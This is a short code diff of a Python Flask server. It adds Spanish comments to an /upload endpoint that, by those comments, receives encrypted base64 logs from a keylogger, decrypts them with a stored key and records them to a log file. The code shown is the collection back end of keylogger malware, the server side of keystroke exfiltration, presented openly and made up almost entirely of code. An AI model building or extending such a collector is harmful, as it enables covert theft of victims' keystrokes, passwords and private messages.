@@ -34,13 +34,14 @@ LOG_FILE = "received_logs.txt"
 
 @app.route("/upload", methods=["POST"])
 def upload():
+    """Endpoint que recibe el JSON cifrado del keylogger y descifra con secret.key."""
     try:
         data = request.get_json()
         if not data or "payload" not in data:
             return jsonify({"error": "Payload faltante"}), 400
 
-        encrypted = data["payload"]
-        decrypted = decrypt(encrypted, KEY)
+        encrypted = data["payload"]  # string base64 del keylogger
+        decrypted = decrypt(encrypted, KEY)  # falla si clave incorrecta o dato alterado
 
         timestamp = data.get("timestamp", datetime.utcnow().isoformat())
 
